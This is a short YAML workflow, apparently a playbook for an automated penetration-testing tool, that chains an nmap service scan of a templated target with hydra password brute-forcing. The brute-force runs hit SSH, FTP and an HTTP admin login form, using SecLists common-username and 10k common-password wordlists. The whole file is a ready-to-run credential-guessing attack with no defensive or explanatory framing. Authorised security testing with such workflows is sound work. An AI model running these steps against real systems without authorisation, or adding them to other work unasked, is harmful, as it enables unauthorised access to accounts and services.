steps:
  - tool: nmap
    arguments:
      target: "{target}"
      scan_type: "-sV"
      ports: "21,22,80,443,8080,8443"
      additional_args: "-T4"

  - tool: hydra
    arguments:
      target: "{target}"
      service: "ssh"
      userlist: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
      passlist: "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
      additional_args: "-t 4"

  - tool: hydra
    arguments:
      target: "{target}"
      service: "ftp"
      userlist: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
      passlist: "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
      additional_args: "-t 4"

  - tool: hydra
    arguments:
      target: "{target}"
      service: "http-post-form"
      userlist: "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
      passlist: "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
      additional_args: '"/admin/login.php:user=^USER^&pass=^PASS^:Login failed" -t 4'
